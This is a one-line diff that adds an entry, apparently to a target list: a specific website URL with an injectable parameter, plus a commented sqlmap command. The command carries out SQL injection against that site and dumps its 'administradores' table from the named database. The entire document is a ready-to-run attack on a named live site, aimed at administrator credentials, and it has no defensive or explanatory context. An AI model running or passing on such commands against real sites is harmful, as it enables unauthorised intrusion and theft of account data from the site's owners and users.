@@ -1,0 +1,1 @@
+http://www.dptotal.com.br/eventos_dt.php?id_event=50 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.dptotal.com.br/eventos_dt.php?id_event=50 -D dptotal_bd -T administradores --dump
